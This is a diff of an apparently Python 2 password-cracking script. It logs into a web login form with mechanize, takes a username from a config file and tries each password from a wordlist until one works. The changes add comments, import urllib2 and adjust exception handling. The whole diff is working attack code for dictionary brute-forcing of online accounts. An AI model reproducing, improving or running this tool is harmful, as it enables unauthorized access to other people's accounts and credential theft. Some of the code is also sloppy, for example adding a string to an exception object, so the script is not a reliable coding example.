@@ -12,6 +12,7 @@ import mechanize
 import time
 import os
 import ConfigParser
+import urllib2
 from multiprocessing import Process
 from pathlib import Path
 from bs4 import BeautifulSoup
@@ -45,20 +46,28 @@ def def_config ():
 	configParser = ConfigParser.RawConfigParser()	
 	configParser.read('config')
 
+	# Read in the username and wordlist from the config file.
 	global passwords
 	global dic_path
 	dic_path = configParser.get('Config','dict')
 	username = configParser.get('Config', 'user')
+
+	# The wordlist file does not exist.
 	if (Path(dic_path).is_file() == False):
 		color_print("\n\n[!] Please define the username and wordlist in the config file", color='red')
 		return
+
+	# There is no username and wordlist specified in the config file.
 	if username == 'username' and dic_path == 'wordlist':
 		color_print("\n\n[!] You need to setup the config file", color='red')
 		return
 
 	else:
+		#
+		# Start the crack
+		#
 		def_setup()
-		def_process(def_login())
+		def_process(def_login)
 
 #
 # Setup the browser.
@@ -92,7 +101,7 @@ def def_setup():
 	try:
 		browser.open(url)
 		browser.select_form(nr = 0)
-	except URLError as e:
+	except urllib2.URLError, e:
 		color_print("Try resetting your network interface" + e)
 
 #
@@ -107,6 +116,7 @@ def def_process (f):
 #
 def def_login():
 
+
 	# read in the username from the config file.
 	browser.form['email'] = configParser.get('Config', 'user')
 	
@@ -114,6 +124,7 @@ def def_login():
 		line = fp.readline()
 	   	while line:
 	
+
 			# This is the current password in the dictionary 
 			# that we attempt to login with
 			#
@@ -126,7 +137,7 @@ def def_login():
 			# Try to Submit
 			try:
  				request = browser.submit()
-			except URLError as e:
+			except urllib2.URLError, e:
 				color_print("Try resetting your network interface" + e)
 			
 
